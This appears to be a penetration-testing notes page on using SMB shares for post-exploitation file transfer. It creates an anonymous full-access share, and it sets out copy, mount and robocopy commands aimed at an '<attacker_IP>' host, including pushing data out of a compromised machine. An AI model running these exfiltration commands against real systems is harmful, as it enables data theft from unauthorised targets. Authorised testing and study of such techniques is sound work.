# SMB

## 01 - Server Setup

### 1.1 - Comand Prompt

Create an anonymous SMB share.

```
C:\> md "<drive_letter>:\path\to\directory\" 

C:\> net.exe share <share_name>="<drive_letter>:\path\to\directory\" /grant:Everyone,FULL /grant:Guests,FULL /grant:"Anonymous Logon",FULL
```

To remove the SMB share.

```
C:\> net.exe share <share_name> /delete
```

### 1.2 - Powershell

Create an anonymous SMB share.

```
PS C:\> New-Item "<drive_letter>:\path\to\directory\" -ItemType Directory

New-SmbShare -Name "<share_name>" -Path "<drive_letter>:\path\to\directory\" -FullAccess "Everyone","Guests","Anonymous Logon"
```

To remove the SMB share.

```
PS C:\> Remove-SmbShare -Force -Name "<share_name>"
```

## 02 - Usage

### 2.1 - Command Prompt

List the files to check if the share is accessible.

```
C:\> dir \\<attacker_IP>\<share_name>
```

Copy the file from the network share.

```
C:\> copy \\<attacker_IP>\<share_name>\<source> <destination>
```

For `/mt` flag switch run the command on windows that is related about hardware information from [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Windows/Host/0xI - Operating System/Kernel/Manual/Living off the Land|system and kernel version]] phase.

```
C:\> robocopy <source> \\<IP>\<share_name>\<destination> /s /r:0 /w:0 /copy:DA /dcopy:DA /mt:<threads>
```

You can mount the share remotely.

> [!INFO] Error Message
> The message is self-explanatory. Just specify username and password on the server side and it'll work just fine.
> 
> ```
> System error 1272 has occurred.
> 
> You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
> ```

```
C:\> net.exe use \\<attacker_IP>\<share_name> [/user:<username> <password>]

C:\> net.exe use <drive_letter>: \\<attacker_IP>\<share_name> [/user:<username> <password>]
```

To unmount the share network.

```
C:\> net.exe use /delete \\<attacker_IP>\<share_name>

C:\> net.exe use <drive_letter>: /delete
```

### 2.2 - PowerShell

List the files to check if the share is accessible.

```
PS C:\> Get-ChildItem \\<attacker_IP>\<share_name>
```

Copy the file from the network share.

```
PS C:\> Copy-Item \\<attacker_IP>\<share_name>\<source> <destination>
```

You can mount the share remotely. Pass the credentials if required.

```powershell
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force

$credential = New-Object System.Management.Automation.PSCredential("<username>", $password)

New-PSDrive -Name <drive_letter> -PSProvider FileSystem -Root "\\<attacker_IP>\<share_name>" [-Credential $credential]
```

To unmount the share network.

```
PS C:\> Remove-PSDrive -Name <drive_letter>
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x05 - File Transfer and Data Exfiltration/Linux/Network Ports/SMB]]

### Chris Titus

- [Chris Titus: Robocopy](https://www.christitus.com/robocopy)

### InfoSec Matter

- [InfoSec Matter: Powershell Commands for Pentesters](https://www.infosecmatter.com/powershell-commands-for-pentesters/)